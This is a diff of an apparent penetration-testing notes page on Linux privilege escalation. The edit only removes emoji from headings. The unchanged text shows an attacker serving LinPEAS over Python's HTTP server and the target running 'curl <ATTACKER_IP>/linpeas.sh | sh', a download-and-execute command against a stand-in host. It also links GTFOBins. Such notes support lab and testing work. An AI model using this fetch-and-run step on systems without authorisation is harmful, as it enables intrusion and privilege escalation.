@@ -4,13 +4,13 @@ description: Tools and methodology for Linux PrivEsc
 
 # Linux
 
-## 🔥 LinPEAS - Linux Privilege Escalation Awesome Script
+## LinPEAS - Linux Privilege Escalation Awesome Script
 
 When escalating privileges, one of the **fastest** ways to transfer and execute an enumeration script like `linpeas.sh` is using Python’s built-in HTTP server combined with `curl`.
 
 ***
 
-#### &#x20;**📌 Attacker: Start a Simple Web Server**
+#### &#x20;**Attacker: Start a Simple Web Server**
 
 Run the following command on your **attacking machine** to serve files from the current directory:
 
@@ -18,7 +18,7 @@ Run the following command on your **attacking machine** to serve files from the 
 python3 -m http.server 80
 ```
 
-#### &#x20;**📌 Victim: Download & Execute LinPEAS**
+#### &#x20;**Victim: Download & Execute LinPEAS**
 
 On the **target machine**, download and execute LinPEAS in one step:
 
@@ -26,7 +26,7 @@ On the **target machine**, download and execute LinPEAS in one step:
 curl <ATTACKER_IP>/linpeas.sh | sh
 ```
 
-## 🛑 GTFOBins
+## GTFOBins
 
 {% embed url="https://gtfobins.github.io/" %}
 
